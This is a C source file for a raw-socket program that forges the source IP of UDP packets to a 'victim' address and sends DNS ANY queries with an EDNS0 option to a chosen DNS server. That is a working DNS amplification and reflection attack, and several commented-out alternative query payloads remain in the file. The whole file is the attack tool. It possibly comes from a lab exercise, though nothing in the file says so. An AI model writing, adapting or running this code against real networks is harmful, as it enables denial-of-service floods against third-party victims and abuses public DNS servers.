#include <arpa/inet.h> // htons
#include <asm/sockios.h> // this is for SIOCGIF(Put the interface index into the ifreq structure)
#include <linux/if_packet.h>
#include <net/if.h> // struct ifreq
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>  // ioctl
#include <sys/socket.h> // this for struct sockaddr, socket ,and AF_INET
#include <unistd.h>     //getpid
#include<memory.h>

unsigned short csum(unsigned short *buf, int nwords)
{
  unsigned long sum;
  for(sum=0; nwords>0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum &0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}

int main(int argc, char **argv){
  if(argc != 4){
    fprintf(stderr, "<Usage>:%s <victim ip> <udp source prot> <dns server ip>\n", argv[0]);
    exit(1);
  }
  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sockfd == -1){
		fputs("socket create failed...\n", stderr);
		exit(1);
	}
  puts("socket create... thank for using 'sudo'");
  char buffer[100];
  //unsigned char DNS[] = { 0xd8, 0xcb , 0x01, 0x00, 0x00, 0x01, 0x00 ,0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77, 0x08, 0x63, 0x68, 0x6f, 0x6e, 0x67, 0x66, 0x65,0x72, 0x02, 0x63, 0x6e, 0x00, 0x00, 0x01, 0x00, 0x01 };
  //unsigned char DNS[] = {0x01, 0x20,0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x75, 0x73, 0x03, 0x6f, 0x72, 0x67, 0x00, 0x00, 0xff, 0x00, 0x01, 0x00, 0x00, 0x29, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  //unsigned char DNS[] = {0x2b, 0xa5, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x75, 0x73, 0x03, 0x6f, 0x72, 0x67, 0x00, 0x00, 0xff, 0x00, 0x01};
  //unsigned char DNS[] = {0x3c, 0xb3, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x75, 0x73, 0x03, 0x6f, 0x72, 0x67, 0x00, 0x00, 0xff, 0x00, 0x01};
  //unsigned char DNS[] = {0x3c, 0xb3, 0x83, 0x80, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x75, 0x73, 0x03, 0x6f, 0x72, 0x67, 0x00, 0x00, 0xff, 0x00, 0x01};0x00, 0x2f,
  unsigned char DNS[]={0x67, 0x31, 0x01, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x75, 0x73, 0x03, 0x6f, 0x72, 0x67, 0x00, 0x00, 0xff, 0x00, 0x01, 0x00, 0x00,0x29, 0x10, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x0a, 0x00, 0x08, 0xc1, 0xf2, 0xac, 0xa8, 0x66, 0x99, 0x63, 0x66};
  struct iphdr *ip = (struct iphdr*)buffer;
  struct udphdr *udp = (struct udphdr *)(buffer + sizeof(struct iphdr));
  struct sockaddr_in saddr, daddr;
  memset(buffer, 0 , 100);
  int one = 1;
  const int *val = &one;
  if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))){
    perror("setsockopt() error");
    exit(1);
  }else puts("setsockopt success...");

  saddr.sin_family = AF_INET;
  daddr.sin_family = AF_INET;

  saddr.sin_port = htons(atoi(argv[2]));
  daddr.sin_port = htons(53);

  saddr.sin_addr.s_addr = inet_addr(argv[1]);
  daddr.sin_addr.s_addr = inet_addr(argv[3]);

  ip->ihl = 5; //header length 5*32bits
  ip->version = 4; 
  ip->tos = 0; //default
  ip->tot_len = ((sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS)));
  puts("lol");
  ip->ttl = 64;
  ip->protocol = 17;
  ip->check = 0;
  ip->saddr = inet_addr(argv[1]);
  ip->daddr = inet_addr(argv[3]);

  udp->source = htons(atoi(argv[2]));
  udp->dest = htons(53);
  udp->len = htons(sizeof(struct udphdr) + sizeof(DNS));
  udp->check = 0;
  setuid(getpid());
  printf("sending...\n");
  printf("Using Source IP: %s port: %s, Target IP: %s port: 53.\n", argv[1], argv[2], argv[3]);
  printf("ip length: = %d\n", ip->tot_len);

  memcpy(buffer + sizeof(struct iphdr) + sizeof(struct udphdr), DNS, sizeof(DNS));
  for(int i = 0 ; i < 3 ; i++){
    if (sendto(sockfd, buffer, ip->tot_len, 0, (struct sockaddr *)&daddr, sizeof(daddr)) < 0){
        perror("sendto() error");
        exit(-1);
    }
    printf("sending packet %d...\n", i+1);
    sleep(1);
  }
  close(sockfd);
  return 0;
}